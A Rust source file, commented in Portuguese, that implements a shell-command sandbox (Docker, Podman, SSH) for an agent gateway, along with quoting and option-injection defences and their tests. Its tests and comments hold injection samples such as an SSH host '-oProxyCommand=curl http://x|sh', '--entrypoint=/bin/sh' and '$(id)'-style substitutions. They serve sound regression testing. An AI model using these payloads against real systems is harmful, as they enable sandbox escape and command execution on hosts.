//! Sandbox por tool (P0 do gap analysis 2026-09-15, ref. OpenClaw
//! `gateway/sandboxing`): comandos de shell podem ser executados dentro de um
//! container em vez do host, com escape hatch "elevated" duplamente gated.
//!
//! Princípios:
//! - **Fail-closed**: se o sandbox é obrigatório e o backend não está
//!   disponível, o comando NÃO roda no host — erro explícito.
//! - **Zero mudança por default**: `SandboxPolicy::default()` é `Off`; quem
//!   não configurar nada continua com o comportamento atual (GAR-236/497,
//!   execution budget etc. continuam valendo — sandbox é camada adicional,
//!   não substituto do safety gate).
//! - OpenShell e Crabbox **não estão implementados** — não há variante de
//!   `SandboxBackend` para eles e nenhuma entrega prometida; o assunto está
//!   registrado na #1225 (issue de tracking, slices S2/S3). Backends que
//!   existem: Docker, Podman e SSH.
//! - **Unix na prática**: o `BashTool` escolhe `powershell -Command` no
//!   Windows e entregaria a ele uma linha com quoting POSIX. Ligar o sandbox
//!   fora de unix não contém nada — ver `docs/security/threat-model.md` §5.12.
//! - A configuração do operador é a seção `agent.sandbox` (#1225), traduzida
//!   por `garraia_gateway::bootstrap::sandbox_policy_from`.

use garraia_common::{Error, Result};
use serde::{Deserialize, Serialize};
use std::path::Path;

/// Quoting POSIX para interpolar um valor numa linha de shell.
///
/// Envolve em **aspas simples** e escapa cada aspa simples interna com a
/// sequência `'\''` (fecha, escapa uma literal, reabre). Dentro de aspas
/// simples o shell não expande absolutamente nada — nem `$`, nem crase, nem
/// `!`, nem `;` — que é precisamente a garantia necessária aqui.
///
/// Isto existe porque a primeira versão usava `{:?}` (o `Debug` do Rust) para
/// "citar" o comando. `escape_debug` escapa `"`, `\` e controles, e **não**
/// toca em `$` nem em crase — então `$(id)` dentro de aspas duplas seguia vivo
/// e era expandido pelo shell do host **antes** do `docker run` existir. O
/// comando nunca entrava no container: rodava no host, contornando
/// `--network none` e `--security-opt no-new-privileges`. Fail-closed no
/// backend ausente, fail-open no conteúdo — o pior dos dois.
fn sh_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', r"'\''"))
}

/// Um valor que ocupa posição numa linha de comando e que o programa alvo
/// leria como **opção** se começasse com `-`.
///
/// `sh_quote` garante um token único — isso barra injeção de *comando*, não
/// de *opção*. O host fica antes do `--` em `ssh {host} -- sh -lc …`, então
/// `ssh '-oProxyCommand=curl http://x|sh' -- …` continua sendo um token só e
/// o `ssh` o lê como flag: o comando do atacante roda no host **local**, sem
/// passar pelo `safety_gate` (que já correu, sobre o comando de dentro). O
/// mesmo vale para `image`, que é posicional do `docker run`.
///
/// Nenhum host real e nenhuma imagem real começa com `-`, então a defesa é
/// recusar em vez de tentar escapar. Isto aqui é a terceira camada: o
/// `garra config check` recusa antes do boot e `sandbox_policy_from` recusa
/// na construção da policy. A camada de dentro existe porque uma
/// `SandboxPolicy` também pode ser montada por código (ou desserializada)
/// sem passar por nenhuma das duas.
///
/// O conserto estrutural — montar argv em vez de uma linha de shell — é
/// acompanhamento na #1225 (slices S2/S3), como já recomendado na #1231.
fn parece_opcao(valor: &str) -> bool {
    valor.trim_start().starts_with('-')
}

/// Se o wrap de sandbox pode acontecer na plataforma alvo.
///
/// Parametrizado em `alvo_unix` em vez de ler `cfg!(unix)` por dentro para o
/// ramo não-unix ser exercitável por teste a partir de qualquer host — caso
/// contrário ele só teria cobertura num runner Windows, que é o mesmo que
/// dizer "nunca".
///
/// Fora de unix o `BashTool` escolhe `powershell -Command` e receberia uma
/// linha com quoting POSIX (`docker run … sh -lc '…'`). O PowerShell escapa
/// aspa simples como `''`, não como `'\''`, então a linha não volta a ser o
/// comando original: o resultado é contenção que parece ligada e não é.
/// Fail-closed é a única resposta honesta.
fn plataforma_permite_wrap(alvo_unix: bool) -> Result<()> {
    if alvo_unix {
        Ok(())
    } else {
        Err(Error::Agent(
            "sandbox nao suportado fora de unix: o bash tool usa `powershell -Command`, que nao \
             reparseia o quoting POSIX do wrap. Defina agent.sandbox.mode = off."
                .into(),
        ))
    }
}

/// Backend de sandbox disponível.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum SandboxBackend {
    /// `docker run --rm ...` — requer binário `docker`.
    Docker,
    /// `podman run --rm ...` — requer binário `podman` (rootless).
    Podman,
    /// `ssh <host> -- ...` — execução remota; NÃO é sandbox rígido (documentar
    /// para o operador), útil para isolar do host local.
    Ssh(String),
}

impl SandboxBackend {
    /// Binário/entrypoint que precisa existir para o backend funcionar.
    pub fn binary(&self) -> &str {
        match self {
            SandboxBackend::Docker => "docker",
            SandboxBackend::Podman => "podman",
            SandboxBackend::Ssh(_) => "ssh",
        }
    }

    /// Detecta se o backend está disponível no host (`which <binary>`).
    pub fn is_available(&self) -> bool {
        std::process::Command::new("sh")
            .arg("-c")
            .arg(format!("command -v {} >/dev/null 2>&1", self.binary()))
            .status()
            .map(|s| s.success())
            .unwrap_or(false)
    }
}

/// Modo de aplicação do sandbox por tool.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum SandboxMode {
    /// Comportamento atual: tudo roda no host (default).
    #[default]
    Off,
    /// Toda tool shell-listada roda no sandbox.
    All,
    /// Apenas as tools listadas em `sandboxed_tools` rodam no sandbox.
    Allowlist,
}

/// Política de sandbox, resolvida por tool antes da execução.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SandboxPolicy {
    /// Quais tools passam pelo sandbox.
    #[serde(default)]
    pub mode: SandboxMode,
    /// Tools listadas quando `mode = allowlist`.
    #[serde(default)]
    pub sandboxed_tools: Vec<String>,
    /// Backend a usar quando o sandbox se aplica.
    pub backend: Option<SandboxBackend>,
    /// Imagem do container (Docker/Podman). Default enxuto do Debian.
    #[serde(default = "default_image")]
    pub image: String,
    /// Tools que escapan do sandbox mesmo em modo `all` (escape hatch
    /// duplamente gated: precisa estar aqui E passar no safety gate).
    #[serde(default)]
    pub elevated: Vec<String>,
    /// Monta o diretório de trabalho dentro do container (rw) e usa como cwd.
    #[serde(default = "default_true")]
    pub mount_workdir: bool,
    /// Rede do container desligada (default: sim — comando sandboxado não
    /// fala com a rede; tools de rede rodam elevadas ou fora do sandbox).
    #[serde(default = "default_true")]
    pub network_disabled: bool,
}

fn default_image() -> String {
    "debian:bookworm-slim".into()
}
fn default_true() -> bool {
    true
}

impl Default for SandboxPolicy {
    fn default() -> Self {
        Self {
            mode: SandboxMode::Off,
            sandboxed_tools: Vec::new(),
            backend: None,
            image: default_image(),
            elevated: Vec::new(),
            mount_workdir: true,
            network_disabled: true,
        }
    }
}

impl SandboxPolicy {
    /// Decide se a tool `tool_name` roda no sandbox (antes de checar backend).
    pub fn requires_sandbox(&self, tool_name: &str) -> bool {
        match self.mode {
            SandboxMode::Off => false,
            SandboxMode::All => !self.elevated.iter().any(|t| t == tool_name),
            SandboxMode::Allowlist => self.sandboxed_tools.iter().any(|t| t == tool_name),
        }
    }

    /// Tools que rodam no host mesmo com `mode = all`.
    pub fn is_elevated(&self, tool_name: &str) -> bool {
        self.elevated.iter().any(|t| t == tool_name)
    }

    /// Envolve `command` no backend. `cwd` é o diretório de trabalho do host.
    ///
    /// Retorna `Err` fail-closed quando o sandbox é necessário mas o backend
    /// não está disponível — nunca faz fallback silencioso para o host.
    pub fn wrap_command(
        &self,
        tool_name: &str,
        command: &str,
        cwd: &str,
    ) -> Result<Option<String>> {
        if !self.requires_sandbox(tool_name) {
            return Ok(None);
        }
        plataforma_permite_wrap(cfg!(unix))?;
        if parece_opcao(&self.image) {
            // O valor nao entra na mensagem: ele pode carregar o comando do
            // atacante, e o erro vai para o log e para a resposta da tool.
            return Err(Error::Agent(
                "sandbox fail-closed: agent.sandbox.image comeca com `-` e seria lida como opcao \
                 do docker/podman em vez de nome de imagem"
                    .into(),
            ));
        }
        let backend = self.backend.as_ref().ok_or_else(|| {
            Error::Agent(
                "sandbox obrigatório por config mas nenhum backend definido \
                 (agent.sandbox.backend: docker|podman|ssh)"
                    .into(),
            )
        })?;
        // Antes do `is_available()` de proposito: num host sem cliente `ssh` o
        // erro de backend ausente mascararia o de injecao de opcao, e o
        // operador consertaria o sintoma errado.
        if let SandboxBackend::Ssh(host) = backend
            && parece_opcao(host)
        {
            return Err(Error::Agent(
                "sandbox fail-closed: o host do ssh comeca com `-` e seria lido como opcao do \
                 ssh (ex.: -oProxyCommand), executando no host LOCAL"
                    .into(),
            ));
        }
        if !backend.is_available() {
            return Err(Error::Agent(format!(
                "sandbox fail-closed: backend `{}` não encontrado no host; \
                 instale-o, marque a tool como elevated, ou defina \
                 agent.sandbox.mode = off",
                backend.binary()
            )));
        }
        Ok(Some(match backend {
            SandboxBackend::Docker | SandboxBackend::Podman => {
                let runtime = match backend {
                    SandboxBackend::Docker => "docker",
                    _ => "podman",
                };
                let mut parts = format!(
                    "{runtime} run --rm --security-opt no-new-privileges",
                    runtime = runtime
                );
                if self.network_disabled {
                    parts.push_str(" --network none");
                }
                if self.mount_workdir && Path::new(cwd).exists() {
                    // cwd do host montado rw no mesmo path dentro do container
                    // (mantém caminhos relativos do comando funcionando).
                    let m = sh_quote(cwd);
                    parts.push_str(&format!(" -v {m}:{m} -w {m}"));
                }
                parts.push_str(&format!(
                    " {} sh -lc {}",
                    sh_quote(&self.image),
                    sh_quote(command)
                ));
                parts
            }
            SandboxBackend::Ssh(host) => {
                // NOTA: ssh não isola o host remoto; é isolamento do host
                // local. Documentado como tal no módulo e nos docs.
                //
                // Quoting DUPLO aqui, e não por engano: o `ssh` não entrega
                // argv ao host remoto — ele junta os argumentos numa string e
                // o shell remoto **reparseia**. Uma camada de aspas morre no
                // shell local, a outra no remoto. Com uma só, o comando
                // voltaria a ser interpretado antes de virar comando.
                format!(
                    "ssh {} -- sh -lc {}",
                    sh_quote(host),
                    sh_quote(&sh_quote(command))
                )
            }
        }))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn default_policy_nunca_sandboxa() {
        let p = SandboxPolicy::default();
        assert_eq!(p.mode, SandboxMode::Off);
        assert!(!p.requires_sandbox("bash"));
        // wrap sem necessidade => None, sem tocar em backend
        assert_eq!(p.wrap_command("bash", "ls", "/tmp").unwrap(), None);
    }

    #[test]
    fn mode_all_sandboxa_e_respeita_elevated() {
        let p = SandboxPolicy {
            mode: SandboxMode::All,
            backend: Some(SandboxBackend::Docker),
            elevated: vec!["web_fetch".into()],
            ..SandboxPolicy::default()
        };
        assert!(p.requires_sandbox("bash"));
        assert!(!p.requires_sandbox("web_fetch"));
        assert!(p.is_elevated("web_fetch"));
    }

    #[test]
    fn fail_closed_sem_backend_configurado() {
        let p = SandboxPolicy {
            mode: SandboxMode::All,
            backend: None,
            ..SandboxPolicy::default()
        };
        let err = p.wrap_command("bash", "ls", "/tmp").unwrap_err();
        assert!(err.to_string().contains("nenhum backend"));
    }

    #[test]
    fn fail_closed_backend_ausente() {
        // backend impossível de existir num PATH real de teste:
        let p = SandboxPolicy {
            mode: SandboxMode::All,
            backend: Some(SandboxBackend::Docker),
            ..SandboxPolicy::default()
        };
        // Não assumimos ausência de docker no host de teste; então testamos
        // o contrato via backend Ssh.
        //
        // Os DOIS desfechos são assertados de propósito. `wrap_command` chama
        // `is_available()` antes de montar a string, então num host sem cliente
        // `ssh` o retorno é o erro fail-closed — e a versão anterior deste
        // teste fazia `.unwrap()` direto, quebrando em qualquer máquina sem
        // ssh. Aceitar só um dos ramos esconderia o outro; ignorar o resultado
        // seria teste vazio (o defeito da #1230).
        let ssh = SandboxPolicy {
            mode: SandboxMode::All,
            backend: Some(SandboxBackend::Ssh("box".into())),
            mount_workdir: false,
            ..SandboxPolicy::default()
        };
        match ssh.wrap_command("bash", "echo oi", "/tmp") {
            // Host COM ssh: a string precisa sair com quoting duplo — uma
            // camada para o shell local, outra para o remoto, que reparseia.
            Ok(Some(wrapped)) => assert_eq!(wrapped, r"ssh 'box' -- sh -lc ''\''echo oi'\'''"),
            // Host SEM ssh: o contrato exercitado é o fail-closed.
            Err(e) => assert!(
                e.to_string().contains("fail-closed"),
                "erro inesperado: {e}"
            ),
            Ok(None) => panic!("mode = all deveria sandboxar a tool `bash`"),
        }
        let _ = p; // disponibilidade de docker não é assertida (depende do host)
    }

    #[test]
    fn wrap_docker_inclui_hardening_e_network_off() {
        let p = SandboxPolicy {
            mode: SandboxMode::All,
            backend: Some(SandboxBackend::Docker),
            ..SandboxPolicy::default()
        };
        // Para o teste ser determinístico sem docker instalado, verificamos
        // via allowlist de tool: se o host não tem docker, esperamos erro
        // fail-closed; se tem, esperamos flags de hardening. Ambos os caminhos
        // são válidos — o que NÃO pode acontecer é comando nu.
        match p.wrap_command("bash", "echo oi", "/definitivamente/inexistente") {
            Ok(Some(cmd)) => {
                assert!(cmd.starts_with("docker run --rm"));
                assert!(cmd.contains("--network none"));
                assert!(cmd.contains("no-new-privileges"));
                // cwd inexistente não é montado
                assert!(!cmd.contains("/definitivamente/inexistente"));
            }
            Ok(None) => panic!("sandbox obrigatório não pode devolver None"),
            Err(e) => assert!(e.to_string().contains("fail-closed")),
        }
    }

    /// #1225 F1: `sh_quote` garante UM token — nao garante que o token seja
    /// um *operando*. Um host comecando com `-` fica antes do `--` e o `ssh`
    /// o le como flag; `-oProxyCommand=…` executaria no host LOCAL, que e o
    /// inverso exato do proposito do sandbox, e ja depois do `safety_gate`.
    #[test]
    fn ssh_host_comecando_com_hifen_e_recusado_fail_closed() {
        let p = SandboxPolicy {
            mode: SandboxMode::All,
            backend: Some(SandboxBackend::Ssh(
                "-oProxyCommand=curl http://x|sh".into(),
            )),
            mount_workdir: false,
            ..SandboxPolicy::default()
        };
        let err = p
            .wrap_command("bash", "echo oi", "/tmp")
            .expect_err("host que parece opcao tem de ser recusado");
        let msg = err.to_string();
        assert!(msg.contains("fail-closed"), "msg = {msg}");
        // A mensagem vai para log e para a resposta da tool: o valor do
        // atacante nao pode viajar junto.
        assert!(!msg.contains("ProxyCommand=curl"), "vazou o valor: {msg}");
        // E o desfecho NAO pode depender de haver cliente ssh no host: este
        // guard roda antes do `is_available()` justamente por isso.
        assert!(
            !msg.contains("não encontrado no host"),
            "o erro de backend ausente mascarou o de injecao de opcao: {msg}"
        );
    }

    /// Mesma classe, outro posicional: `image` fica antes do `sh -lc` na
    /// linha do `docker run`, entao um `-…` desloca todo o resto.
    #[test]
    fn image_comecando_com_hifen_e_recusada_fail_closed() {
        let p = SandboxPolicy {
            mode: SandboxMode::All,
            backend: Some(SandboxBackend::Docker),
            image: "--entrypoint=/bin/sh".into(),
            ..SandboxPolicy::default()
        };
        let err = p
            .wrap_command("bash", "echo oi", "/tmp")
            .expect_err("imagem que parece opcao tem de ser recusada");
        assert!(err.to_string().contains("fail-closed"), "err = {err}");
        assert!(!err.to_string().contains("entrypoint"), "vazou: {err}");
    }

    /// O guard so vale onde o sandbox se aplica: `mode = off` continua
    /// devolvendo `None` sem olhar imagem nem backend.
    #[test]
    fn guard_de_opcao_nao_bloqueia_quando_sandbox_nao_se_aplica() {
        let p = SandboxPolicy {
            mode: SandboxMode::Off,
            backend: Some(SandboxBackend::Ssh("-oProxyCommand=x".into())),
            image: "-x".into(),
            ..SandboxPolicy::default()
        };
        assert_eq!(p.wrap_command("bash", "ls", "/tmp").expect("off"), None);
    }

    #[test]
    fn parece_opcao_reconhece_hifen_apos_espaco_e_ignora_nome_normal() {
        assert!(parece_opcao("-o"));
        assert!(parece_opcao("--entrypoint=x"));
        assert!(
            parece_opcao("  -oProxyCommand=x"),
            "espaco a esquerda nao salva"
        );
        assert!(!parece_opcao("debian:bookworm-slim"));
        assert!(!parece_opcao("box.interno"));
        assert!(!parece_opcao("host-com-hifen-no-meio"));
    }

    /// #1225 F2: fora de unix o `BashTool` usa `powershell -Command` e
    /// receberia uma linha com quoting POSIX. O contrato e fail-closed, e os
    /// dois ramos sao exercitados a partir de qualquer host porque a decisao
    /// mora numa funcao parametrizada.
    #[test]
    fn plataforma_nao_unix_falha_fechado() {
        assert!(plataforma_permite_wrap(true).is_ok());
        let err = plataforma_permite_wrap(false).expect_err("nao-unix recusa");
        assert!(
            err.to_string().contains("nao suportado fora de unix"),
            "err = {err}"
        );
    }

    #[test]
    fn parse_json_config() {
        let p: SandboxPolicy = serde_json::from_str(
            r#"{"mode":"allowlist","backend":"docker","sandboxed_tools":["bash"]}"#,
        )
        .expect("json deve parsear");
        assert_eq!(p.mode, SandboxMode::Allowlist);
        assert_eq!(p.backend, Some(SandboxBackend::Docker));
        assert!(p.requires_sandbox("bash"));
        assert!(!p.requires_sandbox("web_search"));

        // Default quando campos ausentes (config do operador mínima).
        let p: SandboxPolicy =
            serde_json::from_str(r#"{"mode":"off"}"#).expect("json deve parsear");
        assert!(!p.requires_sandbox("bash"));
    }
}

/// Regressao do escape de sandbox: metacaractere de shell precisa chegar ao
/// container como **dado**, nunca ser expandido pelo shell do host.
///
/// Os testes que ja existiam afirmavam a presenca das flags de hardening na
/// string (`--network none`, `no-new-privileges`). Nenhum afirmava inercia —
/// e era exatamente ali que o `{:?}` passava.
#[cfg(all(test, unix))]
mod shell_injection_regression {
    use super::*;

    /// Devolve as palavras que o shell REAL produz para `linha`.
    ///
    /// Se a interpolacao for insegura, `$(id)` expande aqui e o retorno traz a
    /// saida do `id` em vez do literal — que e precisamente o bug.
    fn palavras_do_shell(linha: &str) -> Vec<String> {
        let out = std::process::Command::new("sh")
            .arg("-c")
            .arg(format!("printf '%s\\n' {linha}"))
            .output()
            .expect("sh deve existir no host de teste");
        String::from_utf8_lossy(&out.stdout)
            .lines()
            .map(str::to_string)
            .collect()
    }

    #[test]
    fn sh_quote_neutraliza_metacaracteres_num_shell_real() {
        for bruto in [
            "$(id)",
            "`id`",
            "$HOME",
            "a; id",
            "a && id",
            "a | id",
            "fim\"; id; echo \"",
            "aspa'simples",
            "!bang",
            "* ? [glob]",
        ] {
            let palavras = palavras_do_shell(&sh_quote(bruto));
            assert_eq!(
                palavras,
                vec![bruto.to_string()],
                "o shell nao devolveu o literal para {bruto:?}"
            );
        }
    }

    #[test]
    fn wrap_command_entrega_o_comando_como_uma_palavra_literal() {
        let p = SandboxPolicy {
            mode: SandboxMode::All,
            backend: Some(SandboxBackend::Docker),
            ..Default::default()
        };
        for comando in ["$(id)", "`id`", "ls; id", "echo 'oi'"] {
            let wrapped = p
                .wrap_command("bash", comando, "/tmp")
                .expect("wrap")
                .expect("sandbox aplicado");
            let palavras = palavras_do_shell(&wrapped);
            assert_eq!(
                palavras.last().map(String::as_str),
                Some(comando),
                "o comando deveria chegar inteiro e literal; wrapped={wrapped}"
            );
        }
    }

    #[test]
    fn cwd_hostil_nao_vira_comando_extra_nem_se_parte_em_dois() {
        let dir = std::env::temp_dir().join("garra dir; id");
        std::fs::create_dir_all(&dir).expect("mkdir");
        let cwd = dir.to_str().expect("utf8");
        let p = SandboxPolicy {
            mode: SandboxMode::All,
            backend: Some(SandboxBackend::Docker),
            ..Default::default()
        };
        let wrapped = p
            .wrap_command("bash", "ls", cwd)
            .expect("wrap")
            .expect("aplicado");
        let palavras = palavras_do_shell(&wrapped);
        // O mount chega como UMA palavra "<cwd>:<cwd>", com espaco e ';' dentro.
        assert!(
            palavras.iter().any(|w| w == &format!("{cwd}:{cwd}")),
            "mount deveria ser uma palavra so; wrapped={wrapped}"
        );
        assert!(
            !palavras.iter().any(|w| w == "id"),
            "o ';' do cwd virou comando; wrapped={wrapped}"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// O ramo SSH atravessa **dois** shells: o local, e o remoto que reparseia
    /// a string que o `ssh` remonta a partir do argv. Por isso o comando leva
    /// `sh_quote` duas vezes.
    ///
    /// Este teste exercita a propriedade direto no `sh_quote`, sem passar pelo
    /// `wrap_command`, de proposito: o `wrap_command` checa
    /// `SandboxBackend::is_available()` antes de montar a string, e num host
    /// sem cliente `ssh` instalado ele devolve (corretamente) o erro
    /// fail-closed. Amarrar a regressao a presenca do binario faria o teste
    /// passar sem exercitar nada justamente onde nao ha ssh — o mesmo defeito
    /// de teste vacuo descrito na #1230.
    #[test]
    fn duas_camadas_de_quoting_sobrevivem_a_dois_shells() {
        for bruto in ["$(id)", "`id`", "a; id", "aspa'simples"] {
            let carga = sh_quote(&sh_quote(bruto));
            // Camada 1 — shell local: entrega UMA palavra, ainda citada.
            let apos_local = palavras_do_shell(&carga);
            assert_eq!(apos_local.len(), 1, "camada 1 partiu {bruto:?} em varias");
            // Camada 2 — shell remoto: reparseia e devolve o literal.
            assert_eq!(
                palavras_do_shell(&apos_local[0]),
                vec![bruto.to_string()],
                "camada 2 expandiu {bruto:?}"
            );
        }
    }

    /// Uma unica camada NAO basta no caminho do `ssh` — guarda contra alguem
    /// "simplificar" o quoting duplo achando que e redundante.
    #[test]
    fn uma_camada_so_seria_insuficiente_para_o_ssh() {
        let uma = sh_quote("$(id)");
        let apos_local = palavras_do_shell(&uma);
        assert_eq!(apos_local, vec!["$(id)".to_string()]);
        // O shell remoto receberia isto SEM aspas e expandiria.
        let apos_remoto = palavras_do_shell(&apos_local[0]);
        assert_ne!(
            apos_remoto,
            vec!["$(id)".to_string()],
            "se isto passar a ser igual, o quoting duplo virou desnecessario \
             e o comentario do ramo SSH precisa ser revisto"
        );
    }
}
